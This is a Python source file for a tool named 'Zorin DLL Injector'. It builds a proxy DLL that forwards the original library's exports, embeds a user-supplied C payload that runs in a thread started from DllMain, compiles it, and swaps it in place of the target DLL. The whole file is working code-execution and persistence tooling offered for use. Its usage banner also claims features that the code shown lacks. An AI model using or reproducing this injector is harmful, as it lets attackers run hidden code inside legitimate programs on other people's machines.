# Copyright (c) 2025 Zorin Injector Project

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

#!/usr/bin/env python3
"""
Zorin Payload Injector v0.2
"""

import sys
import os
import struct
import subprocess
import tempfile
import shutil
from pathlib import Path

class DLLInjector:
    def __init__(self, dll_path, payload_path, output_path=None):
        self.dll_path = Path(dll_path)
        self.payload_path = Path(payload_path)
        self.output_path = Path(output_path) if output_path else self.dll_path
        
        if not self.dll_path.exists():
            raise FileNotFoundError(f"DLL not found: {dll_path}")
        if not self.payload_path.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")
    
    def get_dll_exports(self):
        """Extract exported functions from the original DLL"""
        print("[+] Extracting exports from original DLL")
        
        cmd = ['dumpbin', '/exports', str(self.dll_path)]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print("[!] dumpbin not available")
                return []
            
            exports = []
            in_exports = False
            
            for line in result.stdout.split('\n'):
                if 'ordinal hint' in line.lower():
                    in_exports = True
                    continue
                
                if in_exports and line.strip():
                    parts = line.split()
                    if len(parts) >= 4:
                        func_name = parts[-1]
                        if func_name and not func_name.startswith('['):
                            exports.append(func_name)
            
            print(f"[+] Found {len(exports)} exported functions")
            return exports
            
        except FileNotFoundError:
            print("[!] dumpbin not found in PATH")
            return []
    
    def create_proxy_dll_source(self):
        """Create proxy DLL source code with embedded payload"""
        print("[+] Creating proxy DLL source code")
        
        # Read user payload
        with open(self.payload_path, 'r') as f:
            payload_code = f.read()
        
        # Remove duplicate includes and rename payload function
        if '#include <windows.h>' in payload_code:
            payload_code = payload_code.replace('#include <windows.h>', '')
        if '#include <stdio.h>' in payload_code:
            payload_code = payload_code.replace('#include <stdio.h>', '')
        if 'void payload()' in payload_code:
            payload_code = payload_code.replace('void payload()', 'void user_payload()')
        
        # Create proxy DLL source with safe initialization
        proxy_code = f'''
#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdio.h>
#include <process.h>

#pragma comment(lib, "user32.lib")

// User payload code
{payload_code}

HMODULE g_original_dll = NULL;
BOOL g_payload_executed = FALSE;

// Safe payload execution thread
unsigned __stdcall PayloadThread(void* param) {{
    user_payload();
    return 0;
}}

// Delayed initialization thread
unsigned __stdcall InitThread(void* param) {{
    // Wait a moment for process to stabilize
    Sleep(100);
    
    if (!g_payload_executed) {{
        g_payload_executed = TRUE;
        
        // Create payload thread
        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, PayloadThread, NULL, 0, NULL);
        if (hThread) {{
            CloseHandle(hThread);
        }}
    }}
    
    return 0;
}}

// DllMain - Entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH: {{
            // Get current DLL path
            char dll_path[MAX_PATH];
            GetModuleFileNameA(hinstDLL, dll_path, MAX_PATH);
            
            // Build path to original DLL
            char original_path[MAX_PATH];
            strcpy_s(original_path, MAX_PATH, dll_path);
            char* last_dot = strrchr(original_path, '.');
            if (last_dot) {{
                strcpy_s(last_dot, MAX_PATH - (last_dot - original_path), "_org.dll");
            }}
            
            // Load original DLL
            g_original_dll = LoadLibraryA(original_path);
            if (!g_original_dll) {{
                // Fallback to original name
                char fallback_path[MAX_PATH];
                GetModuleFileNameA(NULL, fallback_path, MAX_PATH);
                // Find directory and try original name
            }}
            
            // Create initialization thread (non-blocking)
            HANDLE hInitThread = (HANDLE)_beginthreadex(NULL, 0, InitThread, NULL, 0, NULL);
            if (hInitThread) {{
                CloseHandle(hInitThread);
            }}
            
            break;
        }}
        
        case DLL_PROCESS_DETACH: {{
            if (g_original_dll) {{
                FreeLibrary(g_original_dll);
                g_original_dll = NULL;
            }}
            break;
        }}
    }}
    
    return TRUE;
}}

// Export forwarding via pragma (if exports.def not used)
#pragma comment(linker, "/EXPORT:DllMain")
    '''
        
        # Save proxy source
        proxy_path = self.payload_path.with_name('proxy_dll.c')
        with open(proxy_path, 'w') as f:
            f.write(proxy_code)
        
        print(f"[+] Proxy source created: {proxy_path}")
        return proxy_path

    def create_def_file(self, exports, dll_name):
        """Create DEF file for export forwarding"""
        def_content = f"LIBRARY {dll_name}\n"
        def_content += "EXPORTS\n"
        
        for i, export in enumerate(exports, 1):
            def_content += f"    {export}={dll_name}_org.{export} @{i}\n"
        
        def_path = self.payload_path.with_name('exports.def')
        with open(def_path, 'w') as f:
            f.write(def_content)
        
        print(f"[+] Created DEF file with {len(exports)} exports")
        return def_path
    
    def compile_proxy_dll(self, proxy_source, def_file, temp_output):
        """Compile proxy DLL"""
        print("[+] Compiling proxy DLL with MinGW")
        
        cmd = [
            'gcc',
            '-shared',
            '-o', str(temp_output),
            str(proxy_source),
            '-Wl,--enable-stdcall-fixup',
            '-Wl,--subsystem,windows',
            '-static-libgcc'
        ]
        
        if def_file and def_file.exists():
            cmd.insert(-3, str(def_file))
        
        cmd.extend(['-luser32', '-lkernel32'])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise RuntimeError(f"Compilation failed:\n{result.stderr}")
        
        print(f"[+] Compilation successful")
        return temp_output
    
    def inject(self):
        """Perform injection"""
        try:
            print("\n[*] Zorin DLL Injector v0.2 \n")
            
            original_backup = self.dll_path.with_name(
                f"{self.dll_path.stem}_org{self.dll_path.suffix}")
            temp_dll = self.dll_path.with_name(
                f"{self.dll_path.stem}_temp{self.dll_path.suffix}")
            
            if original_backup.exists():
                print(f"[!] Backup exists: {original_backup}")
                response = input("[?] Delete and continue? (y/n): ")
                if response.lower() != 'y':
                    return False
                original_backup.unlink()
            
            # Get exports
            exports = self.get_dll_exports()
            
            # Create DEF file
            def_file = None
            if exports:
                def_file = self.create_def_file(exports, self.dll_path.stem)
            
            # Create proxy source
            proxy_source = self.create_proxy_dll_source()
            
            # Compile
            self.compile_proxy_dll(proxy_source, def_file, temp_dll)
            
            # Verify size
            dll_size = temp_dll.stat().st_size
            print(f"[+] Compiled DLL size: {dll_size:,} bytes")
            
            # Perform swap
            print(f"\n[+] Performing DLL swap...")
            shutil.move(str(self.dll_path), str(original_backup))
            print(f"[✓] Original backed up")
            
            shutil.move(str(temp_dll), str(self.dll_path))
            print(f"[✓] Proxy installed")
            
            # Cleanup
            proxy_source.unlink(missing_ok=True)
            if def_file:
                def_file.unlink(missing_ok=True)
            
            temp_path = os.environ.get('TEMP', 'C:\\Temp')
            
            print("\n" + "="*60)
            print("[✓] INJECTION COMPLETED!")
            print("="*60)
            print(f"\n[!] DEBUG FILES TO CHECK:")
            print(f"    1. {os.path.join(temp_path, 'zorin_injection.log')}")
            print(f"    2. C:\\zorin_debug.log")
            print(f"    3. C:\\zorin_payload_started.txt")
            print(f"    4. C:\\zorin_payload_success.txt")
            print(f"\n[!] RUN APPLICATION:")
            print(f"    - Execute: nmap (or any command)")
            print(f"    - Payload will execute IMMEDIATELY on DLL load")
            print(f"    - Check debug files above for confirmation\n")
            
            return True
            
        except Exception as e:
            print(f"\n[✗] Error: {e}")
            import traceback
            traceback.print_exc()
            return False


def print_usage():
    print("""
╔════════════════════════════════════════════════════════════╗
║  Zorin DLL Injector v0.2 - Aggressive Execution          ║
╚════════════════════════════════════════════════════════════╝

Usage: python zorin.py <dll> <payload.c>

New in v0.2:
  • Immediate payload execution (no delay)
  • Multiple execution attempts
  • Enhanced logging to multiple locations
  • Marker files for debugging
  • Better error handling


""")


def main():
    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)
    
    dll_path = sys.argv[1]
    payload_path = sys.argv[2]
    
    print("╔" + "="*58 + "╗")
    print("║  Zorin DLL Injector v0.2             ║")
    print("╚" + "="*58 + "╝")
    
    injector = DLLInjector(dll_path, payload_path)
    success = injector.inject()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()